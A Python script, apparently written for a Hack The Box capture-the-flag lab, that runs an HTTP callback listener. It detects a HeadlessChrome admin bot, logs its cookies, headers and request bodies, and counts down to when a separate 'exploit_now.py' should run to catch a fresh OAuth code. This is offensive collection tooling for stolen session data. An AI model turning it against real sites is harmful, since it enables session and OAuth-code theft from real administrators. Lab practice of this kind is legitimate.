#!/usr/bin/env python3
"""
capture_server.py - Callback capture server for admin bot detection
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from urllib.parse import urlparse, parse_qs, unquote
import sys
import socket
import json
import os
import time

# ANSI Colors
class C:
    R = '\033[91m'   # Red
    G = '\033[92m'   # Green
    Y = '\033[93m'   # Yellow
    B = '\033[94m'   # Blue
    M = '\033[95m'   # Magenta
    C = '\033[96m'   # Cyan
    W = '\033[97m'   # White
    BOLD = '\033[1m'
    X = '\033[0m'    # Reset

LOG_FILE = None
REQUEST_COUNT = 0
VERBOSE = False
LAST_BOT_VISIT = None
BOT_INTERVAL = 180  # Expected interval between bot visits (seconds)

def log(msg):
    print(msg)
    if LOG_FILE:
        import re
        clean = re.sub(r'\033\[[0-9;]*m', '', msg)
        LOG_FILE.write(clean + '\n')
        LOG_FILE.flush()

def show_exploit_timing():
    """Show when to run the real exploit based on bot timing"""
    global LAST_BOT_VISIT

    now = int(time.time())
    next_visit = LAST_BOT_VISIT + BOT_INTERVAL
    time_until_next = next_visit - now

    # We want to run exploit ~10 seconds before bot visits (fresh OAuth code)
    run_in = max(0, time_until_next - 10)
    run_at = now + run_in

    log(f"\n{C.G}{C.BOLD}{'='*60}{C.X}")
    log(f"{C.G}{C.BOLD}  EXPLOIT TIMING{C.X}")
    log(f"{C.G}{'='*60}{C.X}")
    log(f"  Bot last visited:    {time.strftime('%H:%M:%S', time.localtime(LAST_BOT_VISIT))}")
    log(f"  Next visit expected: {time.strftime('%H:%M:%S', time.localtime(next_visit))} (~{time_until_next}s)")
    log(f"  Run exploit at:      {time.strftime('%H:%M:%S', time.localtime(run_at))} (in {run_in}s)")
    log(f"")
    log(f"  {C.Y}Command:{C.X} python3 exploit_now.py")
    log(f"{C.G}{'='*60}{C.X}")

    # Start countdown thread
    import threading
    def countdown():
        remaining = run_in
        while remaining > 0:
            if remaining <= 30 and remaining % 10 == 0:
                log(f"\n{C.Y}{C.BOLD}  >>> RUN EXPLOIT IN {remaining} SECONDS <<<{C.X}")
            elif remaining <= 10:
                log(f"\n{C.R}{C.BOLD}  >>> RUN EXPLOIT NOW! {remaining}s <<<{C.X}")
            time.sleep(1)
            remaining -= 1
        log(f"\n{C.R}{C.BOLD}  >>> GO GO GO! Run: python3 exploit_now.py <<<{C.X}")

    t = threading.Thread(target=countdown, daemon=True)
    t.start()

class CaptureHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def handle(self):
        """Override to catch connection reset errors"""
        try:
            super().handle()
        except (ConnectionResetError, BrokenPipeError):
            pass  # Client disconnected, ignore

    def handle_request(self, method):
        global REQUEST_COUNT, LAST_BOT_VISIT
        REQUEST_COUNT += 1

        ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
        client_ip, client_port = self.client_address
        user_agent = self.headers.get('User-Agent', '')
        referer = self.headers.get('Referer', '')
        is_bot = 'HeadlessChrome' in user_agent

        # Read body if present
        body = None
        content_length = self.headers.get('Content-Length')
        if content_length and int(content_length) > 0:
            body = self.rfile.read(int(content_length))

        # Parse query params
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        # Calculate elapsed time and lookup article ID if ts param present
        elapsed = None
        article_id = None
        if 'ts' in params:
            try:
                ts_val = params['ts'][0]
                created_ts = int(ts_val)
                elapsed = int(time.time()) - created_ts

                # Try to lookup article ID from mapping file
                mapping_file = os.path.join(os.path.dirname(__file__), 'tmp', 'test_mapping.json')
                if os.path.exists(mapping_file):
                    with open(mapping_file) as f:
                        mapping = json.load(f)
                    if ts_val in mapping:
                        article_id = mapping[ts_val].get('article_id')
            except:
                pass

        if VERBOSE:
            log(f"\n{'='*70}")
            log(f"{C.BOLD}{C.C}REQUEST #{REQUEST_COUNT}{C.X} @ {ts}")
            log('='*70)

            log(f"\n{C.B}CONNECTION{C.X}")
            log(f"  Client:    {client_ip}:{client_port}")
            log(f"  Server:    {self.server.server_address[0]}:{self.server.server_address[1]}")

            log(f"\n{C.G}REQUEST{C.X}")
            log(f"  Method:    {method}")
            log(f"  Path:      {self.path}")
            log(f"  Version:   {self.request_version}")

            if params:
                log(f"\n{C.Y}QUERY PARAMS{C.X}")
                for key, values in params.items():
                    for val in values:
                        log(f"  {key}: {unquote(val)}")

            log(f"\n{C.M}HEADERS{C.X}")
            for header, value in self.headers.items():
                h = header.lower()
                if h == 'user-agent':
                    log(f"  {C.C}{header}{C.X}: {value}")
                    if 'HeadlessChrome' in value:
                        log(f"  {C.R}{C.BOLD}  >>> HEADLESS CHROME <<<{C.X}")
                elif h == 'cookie':
                    log(f"  {C.R}{header}{C.X}:")
                    for c in value.split(';'):
                        log(f"    {c.strip()}")
                elif h == 'referer':
                    log(f"  {C.Y}{header}{C.X}: {value}")
                else:
                    log(f"  {header}: {value}")

            if body:
                log(f"\n{C.R}BODY{C.X} ({len(body)} bytes)")
                try:
                    log(f"  {body.decode('utf-8')[:500]}")
                except:
                    log(f"  [binary data]")

            log(f"\n{C.W}ANALYSIS{C.X}")
            if is_bot:
                log(f"  {C.R}{C.BOLD}! Admin bot (HeadlessChrome){C.X}")
            if client_ip.startswith('10.129.') or client_ip.startswith('10.10.'):
                log(f"  {C.G}+ HTB network IP{C.X}")
            if 'oauth' in self.path.lower():
                log(f"  {C.Y}+ OAuth-related path{C.X}")
            if article_id:
                log(f"  {C.G}{C.BOLD}+ Source: Article ID {article_id}{C.X}")
            if elapsed is not None:
                log(f"  {C.Y}{C.BOLD}+ Elapsed: {elapsed}s since creation{C.X}")

            # Only show big alert for meaningful callbacks, not favicon/assets
            is_meaningful = not any(x in self.path.lower() for x in ['/favicon', '.ico', '.png', '.jpg', '.css', '.js'])
            if is_bot and is_meaningful:
                log(f"\n{C.R}{C.BOLD}{'*'*50}")
                log(f"  ADMIN BOT CALLBACK!")
                log(f"{'*'*50}{C.X}")

                # If this was a test mode callback, show timing for real exploit
                if '/oauth_test' in self.path or ('mode=test' in self.path):
                    LAST_BOT_VISIT = int(time.time())
                    show_exploit_timing()

        else:
            # Compact output
            color = C.R if is_bot else C.G
            bot_tag = f" {C.R}[BOT]{C.X}" if is_bot else ""
            log(f"\n{color}[#{REQUEST_COUNT}]{C.X} {ts}{bot_tag}")
            log(f"  {method} {self.path}")
            log(f"  From: {client_ip}")
            log(f"  UA: {user_agent[:50]}{'...' if len(user_agent) > 50 else ''}")
            if article_id:
                log(f"  {C.G}Source: Article {article_id}{C.X}")
            if elapsed is not None:
                log(f"  {C.Y}Elapsed: {elapsed}s{C.X}")
            is_meaningful = not any(x in self.path.lower() for x in ['/favicon', '.ico', '.png', '.jpg', '.css', '.js'])
            if is_bot and is_meaningful:
                log(f"  {C.R}{C.BOLD}>>> ADMIN BOT <<<{C.X}")

                # If this was a test mode callback, show timing for real exploit
                if '/oauth_test' in self.path or ('mode=test' in self.path):
                    LAST_BOT_VISIT = int(time.time())
                    show_exploit_timing()

        # Send response
        try:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<html><body>OK</body></html>')
        except (ConnectionResetError, BrokenPipeError):
            pass  # Client disconnected

    def do_GET(self):
        self.handle_request('GET')

    def do_POST(self):
        self.handle_request('POST')

    def do_PUT(self):
        self.handle_request('PUT')

    def do_HEAD(self):
        self.handle_request('HEAD')

def check_port(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind(('0.0.0.0', port))
        sock.close()
        return True
    except OSError:
        return False

def main():
    global LOG_FILE, VERBOSE

    host = '0.0.0.0'
    port = 8888

    args = sys.argv[1:]
    i = 0
    while i < len(args):
        arg = args[i]
        if arg in ['-v', '--verbose']:
            VERBOSE = True
        elif arg == '--log' and i + 1 < len(args):
            LOG_FILE = open(args[i + 1], 'a')
            i += 1
        elif arg.isdigit():
            port = int(arg)
        i += 1

    if not check_port(port):
        print(f"[-] Port {port} in use. Try: python3 capture_server.py {port + 1}")
        sys.exit(1)

    mode = "verbose" if VERBOSE else "compact"
    print(f"""
{C.C}CAPTURE SERVER{C.X}
  Listen: {host}:{port}
  Mode:   {mode}
  Usage:  python3 capture_server.py [port] [-v]

Waiting for requests... (Ctrl+C to stop)
""")

    server = HTTPServer((host, port), CaptureHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n[*] Stopped. Total requests: {REQUEST_COUNT}")
        if LOG_FILE:
            LOG_FILE.close()

if __name__ == '__main__':
    main()
